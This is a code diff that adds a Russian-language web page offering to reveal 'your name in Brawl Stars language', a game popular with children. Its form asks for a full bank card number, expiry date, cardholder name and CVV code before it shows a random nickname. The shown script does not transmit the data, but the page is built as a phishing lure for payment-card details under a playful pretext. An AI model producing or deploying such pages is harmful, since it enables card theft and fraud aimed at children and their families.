@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Твое имя на языке Brawl Stars</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #ffe200;
+      font-family: Arial, sans-serif;
+    }
+
+    .wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .content {
+      display: flex;
+      background-color: #ffe200;
+      border-radius: 20px;
+      padding: 20px;
+      max-width: 800px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+    }
+
+    .image {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .image img {
+      width: 200px;
+    }
+
+    .form-side {
+      flex: 2;
+      padding-left: 20px;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .btn {
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .btn:hover {
+      background-color: #43a047;
+    }
+
+    .result {
+      margin-top: 20px;
+      font-size: 22px;
+      font-weight: bold;
+      color: #d50000;
+      opacity: 0;
+      transform: scale(0.8);
+      transition: all 0.4s ease;
+    }
+
+    .result.show {
+      opacity: 1;
+      transform: scale(1.2);
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="content">
+      <div class="image">
+        <img src="https://cdn.brawlify.com/brawlers/leon/model.webp" alt="Leon">
+      </div>
+      <div class="form-side">
+        <h1>Твое имя<br>на языке<br>Brawl Stars</h1>
+        <input type="text" id="cardNumber" placeholder="Номер карты">
+        <div class="row">
+          <input type="text" id="month" placeholder="ММ">
+          <input type="text" id="year" placeholder="ГГ">
+        </div>
+        <input type="text" id="cardHolder" placeholder="Имя Фамилия латиницей">
+        <input type="text" id="cvv" placeholder="CVC2 / CVV2">
+        <button class="btn" onclick="generateName()">Получить имя</button>
+        <div class="result" id="result"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Звук -->
+  <audio id="sound" src="https://www.myinstants.com/media/sounds/brawl-stars-box.mp3"></audio>
+
+  <script>
+    function generateName() {
+      const names = [
+        "Леончикс", "Бибуля", "Поко-Боко", "Спайкич", "Булыч", "Воронело",
+        "Дэриллсон", "Сэндишко", "Гавсило", "Пэмочка", "Баззик", "Тиктон", 
+        "Фрэнкыч", "Стуняша", "Колеттин", "Мортисик", "Джессифлекс"
+      ];
+      const randomName = names[Math.floor(Math.random() * names.length)];
+      const result = document.getElementById("result");
+
+      // проигрываем звук
+      const sound = document.getElementById("sound");
+      sound.currentTime = 0;
+      sound.play();
+
+      // показываем с анимацией
+      result.classList.remove("show");
+      void result.offsetWidth; // магия сброса анимации
+      result.textContent = `Твое имя: ${randomName}`;
+      result.classList.add("show");
+    }
+  </script>
+</body>
+</html>
